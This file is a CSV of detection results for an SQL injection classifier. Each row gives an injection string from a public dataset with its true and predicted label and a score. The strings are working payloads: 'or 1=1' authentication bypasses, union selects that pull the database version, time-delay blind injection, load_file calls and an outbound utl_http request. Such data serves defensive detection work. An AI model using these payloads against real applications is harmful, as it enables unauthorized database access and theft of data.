text,source,true_label,pred_label,score_sqli,correct
"select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",sajid576/sql-injection-dataset,1,1,1.7263885197882178,1
)   or   (  'a'  =  'a,sajid576/sql-injection-dataset,1,1,0.9685888079477344,1
"select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",sajid576/sql-injection-dataset,1,1,1.4690869700451654,1
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',sajid576/sql-injection-dataset,1,1,1.1647259175676736,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",sajid576/sql-injection-dataset,1,1,0.4755345664378746,1
"select * from users where id  =  1 or "",."" or 1  =  1 -- 1",sajid576/sql-injection-dataset,1,1,1.6132942212263797,1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",sajid576/sql-injection-dataset,1,1,1.619683782567399,1
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,sajid576/sql-injection-dataset,1,1,1.5787683896660614,1
"select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,1,1,1.4416647789106727,1
"select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",sajid576/sql-injection-dataset,1,1,1.0416312092017699,1
select * from users where id  =  1. <@ or 1  =  1 -- 1,sajid576/sql-injection-dataset,1,1,0.9649028093954869,1
hi' or 'x'  =  'x';,sajid576/sql-injection-dataset,1,1,1.1175298909493918,1
a' waitfor delay '0:0:10'--,sajid576/sql-injection-dataset,1,1,0.8232916598183481,1
"select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,1,1,1.605846829368141,1
select * from users where id  =  1.<@. or 1  =  1 -- 1,sajid576/sql-injection-dataset,1,1,1.0890566472682823,1
admin'  )   or '1'  =  '1'--,sajid576/sql-injection-dataset,1,1,1.8138890244089536,1
"select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",sajid576/sql-injection-dataset,1,1,1.5175699792425257,1
"select * from users where id  =  1 *\ union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,1,1,1.1182373077097356,1
admin'  )   or '1'  =  '1'#,sajid576/sql-injection-dataset,1,1,1.7794120073636588,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',sajid576/sql-injection-dataset,1,1,0.6342588830669066,1
